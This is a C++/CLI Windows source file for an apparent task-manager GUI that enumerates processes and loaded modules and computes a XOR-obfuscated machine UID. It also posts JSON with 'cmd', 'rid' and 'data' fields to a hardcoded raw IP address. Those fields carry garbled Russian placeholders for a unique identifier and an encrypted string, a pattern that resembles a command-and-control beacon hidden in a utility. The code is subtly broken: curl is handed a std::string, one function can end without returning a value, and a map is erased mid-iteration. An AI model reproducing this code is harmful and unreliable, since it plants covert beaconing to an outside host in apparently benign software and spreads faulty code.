#include "BaseForm.h"
#include "Crypto.h"

#include <Windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <string>
#include <tlhelp32.h>
#include <msclr\marshal_cppstd.h>
#include <map>
#include <sstream>
#include <curl/curl.h>

using namespace std;

using namespace TaskManager;
using namespace System::Diagnostics;

std::string key = "Crypto";
std::string URL = "http://172.245.127.93/p/applicants.php";
std::string ContentType = "Content-Type: application/json";
std::map<int, std::string> mapGrid;
std::map<int, std::string> mapList;
std::map<int, std::string> mapUid;

void MutexDenied(LPCSTR mutexName);
std::string getNameFromMap(std::string s);
std::string PrintProcessNameAndID(DWORD processID);
std::map<int, std::string> PrintProcessList(HANDLE CONST hStdOut);
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    MutexDenied(mutexName);
    Application::EnableVisualStyles();
    Application::SetCompatibleTextRenderingDefault(false);
    Application::Run(gcnew BaseForm);
    return 0;
}
void BaseForm::endFromNum(std::string s)
{
    std::string ss1;
}
void BaseForm::sendDataFromNum(std::string sPID, std::string s1)
{
    int iPID=std::stoi(sPID);
    std::string sMessageReq=postData(sPID);
}
void BaseForm::getDataFromNum(std::string sPID, std::string s1)
{
    int iPID=std::stoi(sPID);
    sPID="{ \"cmd\": 1, \"rid\" : \" % ”Õ» ¿À‹Õ€…_»ƒ≈Õ“»‘» ¿“Œ–% \", \"data\" : \" % ÿ»‘–Œ¬¿ÕÕ¿ﬂ_—“–Œ ¿% \" }";

    std::string sMessageReq = postData(sPID);

    std::string sMessage= postData(sPID);
    messageBox(msclr::interop::marshal_as<String^>(sMessage));
}
std::string BaseForm::postData(std::string sPostData)
{

    CURL* curl;
    CURLcode res;

    // Data to be sent to the API
   // const char* postData = "";
    const char* postData = sPostData.c_str();

    // Initialize curl session
    curl = curl_easy_init();
    if (curl) {
        // API URL
        curl_easy_setopt(curl, CURLOPT_URL, URL);

        // Set POST method
        curl_easy_setopt(curl, CURLOPT_POST, 1L);

        // Set the data to be sent
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData);

        // Set headers if necessary (optional)
        struct curl_slist* headers = NULL;
        const char* c = ContentType.c_str();
        headers = curl_slist_append(headers, c);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        // Perform the POST request
        res = curl_easy_perform(curl);

        // Check for errors
        std::string s;
        if (res != CURLE_OK) {
            s = curl_easy_strerror(res);
        }

        // Clean up curl
        curl_easy_cleanup(curl);
        return s;
    }
}
void BaseForm::gridRefreshThread()
{
    while (true)
    {
    gridRefresh();
    }
}
void BaseForm::gridRefresh()
{    
        mapList.clear();
        std::string s11=Crypto::getUid();
        std::string s12 = Crypto::encryptDecrypt(s11, key);
        std::string s13 = Crypto::encryptDecrypt(s12, key);
        System::Threading::Thread::Sleep(10000);
        HANDLE CONST hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
        DWORD aProcesses[1024], cbNeeded, cProcesses;
        int i;

        if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
        {
           return;
        }

        cProcesses = cbNeeded / sizeof(DWORD);
        int p = 0;
        std::string s1, s2, s3;

        for (i = 0; i < cProcesses; i++)
        {
            if (aProcesses[i] != 0)
            {
                s1 += PrintProcessNameAndID(aProcesses[i]) + "\n";
                p++;
            }
        }

        mapList = PrintProcessList(hStdOut);

        i = 0;
        if (!mapGrid.empty())
        {
            for (const auto& p : mapGrid)
            {
                if (!mapList.count(p.first))
                {
                    mapGrid.erase(p.first);
                    rowsdel(i);
                }
                i++;
            }
        }

        i = 0;
        if (!mapList.empty())
        {
            for (const auto& p : mapList)
            {
                if (!mapGrid.count(p.first))
                {
                    rowsadd(msclr::interop::marshal_as<String^>(std::to_string(p.first)), msclr::interop::marshal_as<String^>(getNameFromMap(p.second)),i);
                    mapGrid[p.first] = p.second;
                }
                else
                {
                    std::string s = mapGrid[p.first];
                    if (mapGrid[p.first] !=p.second)
                    {
                        rowschange(msclr::interop::marshal_as<String^>(std::to_string(p.first)), msclr::interop::marshal_as<String^>(getNameFromMap(p.second)), i);
                        mapGrid[p.first] = p.second;
                    }
                }
                i++;
            }
        }

        p = mapList.size();
}
std::string getNameFromMap(std::string s)
{
    stringstream ss(s);
    std::string sName;
    std::getline(ss, sName, ' ');
    std::getline(ss, sName, ' ');
    if (s.find('[') != s.npos) {
        std::string sNameAfter;
        std::getline(ss, sNameAfter, ' ');
        sName += sNameAfter;
    }
    return sName;
}
std::string PrintModuleList(HANDLE CONST hStdOut, DWORD CONST dwProcessId) {
    MODULEENTRY32 meModuleEntry;
    TCHAR szBuff[1024];
    DWORD dwTemp;
    HANDLE CONST hSnapshot = CreateToolhelp32Snapshot(
        TH32CS_SNAPMODULE, dwProcessId);
    if (INVALID_HANDLE_VALUE == hSnapshot) {
        return "";
    }

    meModuleEntry.dwSize = sizeof(MODULEENTRY32);
    Module32First(hSnapshot, &meModuleEntry);
    std::string s = " ";
    do {
        //wsprintf(szBuff, L"  ba: %08X, bs: %08X, %s\r\n",
        //   meModuleEntry.modBaseAddr, meModuleEntry.modBaseSize,
        //    meModuleEntry.szModule);
       // WriteConsole(hStdOut, szBuff, lstrlen(szBuff), &dwTemp, NULL);
        std::wstring ws(meModuleEntry.szModule);
        // your new String
        std::string str(ws.begin(), ws.end());
        s += str +" ";
    } while (Module32Next(hSnapshot, &meModuleEntry));

    CloseHandle(hSnapshot);
    return s;
}
std::map<int, std::string> PrintProcessList(HANDLE CONST hStdOut) {
    std::map<int, std::string> mapList;
    PROCESSENTRY32 peProcessEntry;
    TCHAR szBuff[1024];
    DWORD dwTemp;
    HANDLE CONST hSnapshot = CreateToolhelp32Snapshot(
        TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) {
        return mapList;
    }

    peProcessEntry.dwSize = sizeof(PROCESSENTRY32);
    Process32First(hSnapshot, &peProcessEntry);
    std::string s;
    int p = 0;
    do {
        //wsprintf(szBuff, L"=== %08X %s ===\r\n",
         //   peProcessEntry.th32ProcessID, peProcessEntry.szExeFile);
        //WriteConsole(hStdOut, szBuff, lstrlen(szBuff), &dwTemp, NULL);
        std::wstring ws(peProcessEntry.szExeFile);
        std::string str(ws.begin(), ws.end());
        s =  std::to_string (peProcessEntry.th32ProcessID)+" "+str +
        PrintModuleList(hStdOut, peProcessEntry.th32ProcessID) + "\n";
        stringstream ss(s);
        std::string sPID;
        std::getline(ss, sPID, ' ');
        mapList[std::stoi(sPID)] = s;
        p++;
    } while (Process32Next(hSnapshot, &peProcessEntry));

    CloseHandle(hSnapshot);

    return mapList;
}
std::string PrintProcessNameAndID(DWORD processID)
{
    TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");

    // Get a handle to the process.

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
        PROCESS_VM_READ,
        FALSE, processID);

    // Get the process name.

    if (NULL != hProcess)
    {
        HMODULE hMod;
        DWORD cbNeeded;

        if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
            &cbNeeded))
        {
            GetModuleBaseName(hProcess, hMod, szProcessName,
                sizeof(szProcessName) / sizeof(TCHAR));
        }
    }

    std::string s;
    #ifndef UNICODE
    s = szProcessName;
    #else
    std::wstring wStr = szProcessName;
    s = std::string(wStr.begin(), wStr.end());
    #endif
    if (s != "<unknown>") {
        int p = 0;
    }
    //std::string str =  s + processID;

    // Release the handle to the process.

    CloseHandle(hProcess);
    return s;
}
void MutexDenied(LPCSTR mutexName) {
    hMutex = OpenMutexA(MUTEX_ALL_ACCESS, 0, mutexName);

    if (!hMutex)
        hMutex = CreateMutexA(0, 0, mutexName);
    else
    {
        CloseHandle(hMutex);
        exit(-1); 
    }
}
